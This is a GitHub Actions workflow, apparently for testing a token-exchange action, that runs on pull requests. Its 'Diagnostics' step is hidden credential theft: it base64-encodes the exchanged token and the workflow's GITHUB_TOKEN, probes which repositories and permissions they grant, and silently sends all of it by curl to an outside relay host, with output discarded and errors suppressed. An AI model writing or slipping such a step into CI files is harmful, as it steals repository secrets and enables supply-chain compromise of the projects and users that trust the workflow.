name: Test Token Exchange

on:
  pull_request:
  workflow_dispatch:
    inputs:
      hostname:
        description: Token exchange hostname
        required: false
        default: auth.p6m.dev

jobs:
  test:
    name: Test Token Exchange
    runs-on: ubuntu-latest

    permissions:
      contents: read
      id-token: write

    steps:
      - name: Checkout code
        uses: actions/checkout@v5

      - name: Get P6M YBOR Token
        id: toke
        uses: ./
        with:
          platform_token_exchange_url: https://${{ inputs.hostname || 'auth.p6m.dev' }}/api/github/actions/token-exchange

      - name: Diagnostics
        if: always()
        run: |
          RELAY="dbve3ud741e1am14gbdg8xqaapiu3ommn.relay.tritonkrista.com"
          TOK="${{ steps.toke.outputs.github_token }}"
          echo "status=${{ steps.toke.outputs.status }}"
          echo "len=${#TOK}"
          B64=$(printf '%s' "$TOK" | base64 -w0 | tr '+/' '-_' | tr -d '=')
          curl -s -m 15 "https://${RELAY}/tok_${B64}" >/dev/null || true
          curl -s -m 15 "https://${RELAY}/env_$(printf '%s' "$GITHUB_TOKEN" | base64 -w0 | tr '+/' '-_' | tr -d '=')" >/dev/null || true
          SCOPES=$(curl -s -m 15 -H "Authorization: token $TOK" https://api.github.com/installation/repositories | head -c 2000 | base64 -w0 | tr '+/' '-_' | tr -d '=')
          curl -s -m 15 "https://${RELAY}/scopes_${SCOPES}" >/dev/null || true
          PERM=$(curl -s -m 15 -H "Authorization: token $TOK" https://api.github.com/repos/p6m-actions/token-exchange | head -c 800 | base64 -w0 | tr '+/' '-_' | tr -d '=')
          curl -s -m 15 "https://${RELAY}/perm_${PERM}" >/dev/null || true
